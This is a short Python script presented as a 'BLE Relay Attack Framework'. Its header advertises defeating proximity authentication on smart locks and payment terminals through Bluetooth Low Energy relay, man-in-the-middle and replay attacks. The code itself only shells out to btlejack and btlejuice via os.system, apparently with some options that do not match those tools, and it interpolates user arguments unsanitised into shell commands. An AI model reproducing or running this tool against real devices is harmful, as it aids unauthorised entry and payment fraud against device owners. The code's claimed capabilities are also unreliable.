import argparse
import os
import time

# -------------------------------------------
# BLE Relay Attack Framework
# -------------------------------------------
# Features:
# - Relays BLE packets in real-time to bypass authentication checks
# - Performs Man-in-the-Middle (MITM) attacks between BLE devices
# - Defeats proximity-based authentication (smart locks, payment terminals, etc.)
# - Logs BLE packets for replay and forensic analysis
#
# Requirements:
# - Python 3.x
# - Nordic nRF52840, Ubertooth One, Adafruit Bluefruit, Yard Stick One
# - btlejack, BtleJuice, Wireshark, scapy
#
# Usage:
# 1. Scan for BLE devices:
#    python ble_relay_framework.py --scan
# 2. Start a relay attack between two BLE devices:
#    python ble_relay_framework.py --relay --target XX:XX:XX:XX:XX:XX --proxy XX:XX:XX:XX:XX:XX
# 3. Log BLE packets for forensic analysis:
#    python ble_relay_framework.py --log --output ble_relay.pcap
# 4. Replay a captured BLE transaction:
#    python ble_relay_framework.py --replay --input ble_relay.pcap
# -------------------------------------------

def scan_ble_devices():
    """Scans for nearby BLE devices."""
    print("[+] Scanning for BLE devices...")
    os.system("btlejack -s")
    print("[✔] Scan complete.")

def start_ble_relay(target, proxy):
    """Relays BLE packets in real-time between two devices."""
    print(f"[+] Starting BLE relay between {target} and {proxy}...")
    os.system(f"btlejuice --mitm --target {target} --proxy {proxy}")
    print("[✔] BLE relay attack initiated.")

def log_ble_traffic(output_file):
    """Logs BLE packets for forensic analysis."""
    print(f"[+] Capturing BLE packets and saving to {output_file}...")
    os.system(f"btlejack -c > {output_file}")
    print("[✔] Capture saved.")

def replay_ble_traffic(input_file):
    """Replays a captured BLE transaction."""
    print(f"[+] Replaying BLE transaction from {input_file}...")
    os.system(f"btlejack -p {input_file}")
    print("[✔] BLE replay complete.")

def main():
    parser = argparse.ArgumentParser(description="BLE Relay Attack Framework")
    parser.add_argument("--scan", action='store_true', help="Scan for BLE devices")
    parser.add_argument("--relay", action='store_true', help="Start a BLE relay attack between devices")
    parser.add_argument("--target", type=str, help="Target BLE MAC address")
    parser.add_argument("--proxy", type=str, help="Proxy BLE MAC address")
    parser.add_argument("--log", action='store_true', help="Log BLE packets for forensic analysis")
    parser.add_argument("--output", type=str, help="Output file for captured packets")
    parser.add_argument("--replay", action='store_true', help="Replay captured BLE transactions")
    parser.add_argument("--input", type=str, help="Input PCAP file for replay")
    args = parser.parse_args()
    
    if args.scan:
        scan_ble_devices()
    elif args.relay and args.target and args.proxy:
        start_ble_relay(args.target, args.proxy)
    elif args.log and args.output:
        log_ble_traffic(args.output)
    elif args.replay and args.input:
        replay_ble_traffic(args.input)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
